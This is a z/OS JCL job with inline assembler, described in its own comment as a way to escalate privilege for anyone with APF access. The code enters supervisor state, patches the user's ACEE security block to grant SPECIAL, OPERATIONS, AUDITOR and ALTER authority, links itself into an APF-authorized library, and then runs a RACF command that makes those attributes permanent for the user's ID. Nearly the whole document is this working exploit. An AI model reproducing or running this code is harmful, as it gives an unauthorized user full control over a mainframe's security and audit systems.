//0000000A JOB 0-000-0-000,'ESCALATE   ',
//             CLASS=D,
//             NOTIFY=0000000
//*
//* THIS PROGRAM ALLOWS YOU TO ESCALATE PRIVILEGE IF YOU HAVE ACCESS
//* TO APF
//*
//PROCLIB  JCLLIB ORDER=SYS1.PROCLIB
//*
//BUILD    EXEC ASMACL
//C.SYSLIB DD DSN=SYS1.SISTMAC1,DISP=SHR
//         DD DSN=SYS1.MACLIB,DISP=SHR
//C.SYSIN  DD *
       CSECT
       AMODE 31
       STM 14,12,12(13)
       BALR 12,0
       USING *,12
       ST 13,SAVE+4
       LA 13,SAVE
*
       MODESET KEY=ZERO,MODE=SUP
       L 5,X'224'           POINTER TO ASCB
       L 5,X'6C'(5)         POINTER TO ASXB
       L 5,X'C8'(5)         POINTER TO ACEE
       NI X'26'(5),X'00'
       OI X'26'(5),X'B1'    SPE + OPER + AUDITOR ATTR
       NI X'27'(5),X'00'
       OI X'27'(5),X'80'    ALTER ACCESS
*
       L 13,SAVE+4
       LM 14,12,12(13)
       XR 15,15
       BR 14
*
SAVE   DS 18F
       END
/*
//L.SYSLMOD DD DISP=SHR,DSN=APF.LIBRARY
//L.SYSIN   DD *
  SETCODE AC(1)
  NAME ESCALATE(R)
/*
//*
//STEP01   EXEC PGM=ESCALATE,COND=(0,NE)
//STEPLIB  DD DISP=SHR,DSN=APF.LIBRARY
//*
//STEP02   EXEC PGM=IKJEFT01,COND=(0,NE)
//SYSTSPRT DD SYSOUT=*
//SYSTSIN  DD *
 ALU YOURID SPECIAL OPERATIONS AUDITOR
//*
